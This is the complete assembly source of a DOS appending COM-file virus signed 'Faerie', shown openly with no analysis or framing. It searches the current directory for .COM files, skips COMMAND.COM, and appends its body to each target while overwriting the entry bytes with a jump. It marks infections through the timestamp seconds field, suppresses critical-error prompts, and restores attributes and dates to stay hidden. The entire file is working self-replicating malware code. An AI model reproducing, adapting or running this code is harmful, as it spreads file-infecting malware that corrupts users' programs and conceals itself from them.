.model tiny
.code
cseg    segment
        assume  cs:cseg,ds:cseg,es:cseg,ss:cseg
        org     100h
begin:
dummy_host      db      0e9h,00h,00h
virus_start:
        mov     bp,0000h        ;delta offset
;----------------------------------------------------------------------
        lea     si,[bp+old_bytes]       ;Restore overwritten bytes
        mov     di,0100h
        movsw
        movsb
;----------------------------------------------------------------------
        lea     dx,[bp+new_dta]         ;Set DTA to heap
        mov     ah,1Ah
        int     21h
;----------------------------------------------------------------------
;  Locate a suitable COM file in current directory
;----------------------------------------------------------------------
        lea     dx,[bp+com_mask]
        mov     cx,0002h                ;hidden/normal attribute
        mov     ah,4eh                  ;find first file
find_next:
        int     21h
        jnc     check_file
        jmp     bye_bye                 ;no suitable file found
        ;--------------------------------------------------------------
check_file:
        mov     ax,word ptr [bp+file_time]
        and     al,00011111b            ;mask seconds field
        cmp     al,00010101b            ;check for previous infection
        je      try_again
        ;--------------------------------------------------------------
        mov     ax,word ptr [bp+file_size]
        cmp     ax,(heap-virus_start)   ;check if too small
        jb      try_again
        ;--------------------------------------------------------------
        cmp     ax,65535-(heap_end-virus_start) ;too large?
        ja      try_again
        ;--------------------------------------------------------------
        mov     cx,0004h                ;check if COMMAND.COM
        lea     si,[bp+file_name]
        lea     di,[bp+command_com]
        repe
        cmpsw
        jnz     replicate               ;suitable host has been found
        ;--------------------------------------------------------------
try_again:
        mov     ah,4fh
        jmp     short find_next
;----------------------------------------------------------------------
; A suitable host has been found, procced with replication
;----------------------------------------------------------------------
replicate:
        mov     ax,3524h                ;Get int 24 handler
        int     21h
        mov     word ptr [bp+old_24_off],bx
        mov     word ptr [bp+old_24_seg],es
        mov     ah,25h                  ;Set new int 24 handler
        lea     dx,[bp+offset int24]
        int     21h
        push    cs                      ;Restore ES
        pop     es
        ;--------------------------------------------------------------
        lea     dx,[bp+file_name]
        xor     cx,cx                   ;normal attributes
        mov     ax,4301h                ;set attributes
        int     21h
        ;--------------------------------------------------------------
        lea     dx,[bp+file_name]       ;open file
        mov     ax,3d02h                ;read/write access
        int     21h
        mov     bx,ax                   ;put handle in BX
        ;--------------------------------------------------------------
        lea     dx,[bp+old_bytes]
        mov     cx,03h                  ;read three bytes
        mov     ah,3fh
        int     21h
        ;--------------------------------------------------------------
        xor     dx,dx
        xor     cx,cx
        mov     ax,4202h                ;move file pointer EOF
        int     21h
        ;--------------------------------------------------------------
        sub     ax,03h
        mov     word ptr [bp+virus_start+1],ax
        mov     word ptr [bp+new_bytes+1],ax
        ;--------------------------------------------------------------
        lea     dx,[bp+virus_start]
        mov     cx,heap-virus_start
        mov     ah,40h
        int     21h
        ;--------------------------------------------------------------
        xor     dx,dx
        xor     cx,cx
        mov     ax,4200h                ;move file pointer SOF
        int     21h
        ;--------------------------------------------------------------
        lea     dx,[bp+new_bytes]
        mov     cx,03h
        mov     ah,40h
        int     21h
        ;--------------------------------------------------------------
        mov     dx,word ptr [bp+file_date]
        mov     cx,word ptr [bp+file_time]
        and     cl,11100000b
        or      cl,00010101b
        mov     ax,5701h                ;Restore creation date/time
        int     21h
        ;--------------------------------------------------------------
        mov     ah,3eh                  ;close file
        int     21h
        ;--------------------------------------------------------------
        lea     dx,[bp+file_name]
        xor     cx,cx
        mov     cl,byte ptr [bp+file_attr]
        mov     ax,4301h                ;Restore original attributes
        int     21h
;----------------------------------------------------------------------
; Clean up and return control to host in memory
;----------------------------------------------------------------------
bye_bye:
        mov     ah,1ah                  ; restore DTA to default
        mov     dx,80h                  ; DTA in PSP
        int     21h
        ;--------------------------------------------------------------
        lds     dx,[bp+offset old_24_off]
        mov     ax,2524h                ; Restore int 24 handler
        int     21h
        ;--------------------------------------------------------------
        push    cs
        pop     ds
        mov     ax,0100h
        push    ax
        retn
;----------------------------------------------------------------------
int24:                                  ; New int 24h (error) handler
        mov     al,3                    ; Fail call
        iret                            ; Return control
;**********************************************************************
;* Data Area
;**********************************************************************
command_com     db      'COMMAND.'
com_mask        db      '*.COM',0
old_bytes       db      0cdh,20h,90h
new_bytes       db      0e9h,00h,00h
vanity          db      'Faerie'
;**********************************************************************
;* Heap Area
;**********************************************************************
heap:
new_dta         db      21 dup(?)
file_attr       db      ?
file_time       dw      ?
file_date       dw      ?
file_size       dd      ?
file_name       db      13 dup(?)
old_attrs       db      5 dup(?)
old_24_off      dw      ?
old_24_seg      dw      ?
heap_end:
;*E*N*D**O*F**V*I*R*U*S************************************************
cseg    ends
        end     begin
        